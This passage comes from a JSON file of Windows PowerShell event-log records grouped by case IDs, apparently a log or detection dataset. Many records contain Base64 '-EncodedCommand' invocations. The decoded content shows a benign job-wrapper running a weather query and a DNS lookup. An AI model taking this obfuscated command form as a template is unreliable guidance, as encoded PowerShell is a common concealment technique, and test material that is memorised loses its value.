QAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$commandToRun = @'\nInvoke-RestMethod -Uri http://wttr.in/London\n'@\n$timeoutSeconds = 25\n$result = @{\n    Stdout = \"\"\n    Stderr = \"\"\n    ReturnCode = -1\n}\ntry {\n    $scriptBlock = [scriptblock]::Create($commandToRun)\n    $job = Start-Job -ScriptBlock $scriptBlock\n    if (Wait-Job -Job $job -Timeout $timeoutSeconds) {\n        $output = Receive-Job -Job $job\n        $result.Stdout = ($output | Out-String).Trim()\n        if ($job.State -eq 'Failed') {\n            $result.Stderr = $job.ChildJobs[0].JobStateInfo.Reason.Message\n            $result.ReturnCode = 1\n        } else {\n            $result.ReturnCode = 0\n        }\n    } else {\n        $result.Stderr = \"Command timed out on the server after $timeoutSeconds seconds.\"\n        $result.ReturnCode = 124\n    }\n} catch {\n    $result.Stderr = \"Wrapper Script Error: $($_.Exception.Message)\"\n    $result.ReturnCode = 1\n} finally {\n    if ($job) {\n        Stop-Job -Job $job -ErrorAction SilentlyContinue\n        Remove-Job -Job $job -ErrorAction SilentlyContinue -Force\n    }\n}\n$result | ConvertTo-Json -Compress"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40962,
      "details": "PowerShell console is ready for user input"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 2196 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    }
  ],
  "PS-054": [
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$global:?"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
